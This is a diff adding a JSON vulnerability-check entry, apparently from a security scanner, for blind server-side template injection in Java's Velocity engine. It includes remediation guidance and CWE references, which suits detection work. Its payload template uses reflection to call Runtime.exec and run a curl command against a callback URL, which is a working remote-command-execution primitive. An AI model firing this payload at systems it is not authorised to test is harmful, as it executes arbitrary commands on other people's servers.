@@ -1,0 +1,21 @@
+{
+  "id": "m3-blind-ssti-velocity",
+  "bug_class": "blind_ssti",
+  "title": "Blind SSTI out-of-band callback \u2014 Velocity (java)",
+  "severity": "Critical",
+  "applies_when": {
+    "always": true
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "#set($e=\"\")$e.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl -s {callback}\")"
+  },
+  "references": [
+    "CWE-1336",
+    "CWE-94",
+    "CAPEC-242"
+  ],
+  "remediation": "Do not pass user input into a template as template source. Use the engine's sandboxed/auto-escaping context and pass user data ONLY as rendered variables, never concatenated into the template string; disable dangerous builtins/reflection. The inbound callback proves the target executed the tokened callback URL (a token-matched, receipt-verified out-of-band interaction occurred); that a server-side template evaluation was the cause is the operator's LEAD, confirmed separately \u2014 the out-of-band execution is the proven fact.",
+  "payload_family": "blind-ssti-velocity"
+}
